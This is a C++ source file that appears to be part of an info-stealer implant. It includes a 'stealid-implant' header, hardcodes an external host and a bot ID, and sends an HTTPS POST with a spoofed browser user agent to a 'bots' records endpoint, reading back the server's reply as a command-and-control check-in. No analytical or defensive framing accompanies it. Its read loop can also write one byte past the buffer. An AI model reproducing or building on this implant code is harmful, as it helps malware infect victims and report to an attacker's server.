#include "stealid-implant.h"

#define SERVER_HOST L"movie-fam-api.fly.dev"
#define USER_ID L"3xm65cmh19gzmo6"

int main() {
  HINTERNET hSession = InternetOpenW(
      L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

  HINTERNET hConnect = InternetConnectW(hSession, SERVER_HOST,
                                        INTERNET_DEFAULT_HTTPS_PORT, // THIS
                                        L"", L"", INTERNET_SERVICE_HTTP, 0, 0);

  HINTERNET hHttpFile = HttpOpenRequestW(
      hConnect, L"POST", L"/api/collections/bots/records/" USER_ID, NULL, NULL,
      NULL,
      INTERNET_FLAG_SECURE, // THIS
      0);

  while (!HttpSendRequest(hHttpFile, NULL, 0, 0, 0)) {
    printf("HttpSendRequest error : (%lu)\n", GetLastError());

    InternetErrorDlg(
        GetDesktopWindow(), hHttpFile, ERROR_INTERNET_CLIENT_AUTH_CERT_NEEDED,
        FLAGS_ERROR_UI_FILTER_FOR_ERRORS | FLAGS_ERROR_UI_FLAGS_GENERATE_DATA |
            FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS,
        NULL);
  }

  DWORD dwFileSize;
  dwFileSize = BUFSIZ;

  char *buffer;
  buffer = new char[dwFileSize + 1];

  while (true) {
    DWORD dwBytesRead;
    BOOL bRead;

    bRead = InternetReadFile(hHttpFile, buffer, dwFileSize + 1, &dwBytesRead);

    if (dwBytesRead == 0)
      break;

    if (!bRead) {
      printf("InternetReadFile error : <%lu>\n", GetLastError());
    } else {
      buffer[dwBytesRead] = 0;
      printf("Retrieved %lu data bytes: %s\n", dwBytesRead, buffer);
    }
  }

  InternetCloseHandle(hHttpFile);
  InternetCloseHandle(hConnect);
  InternetCloseHandle(hSession);

  return 0;
}
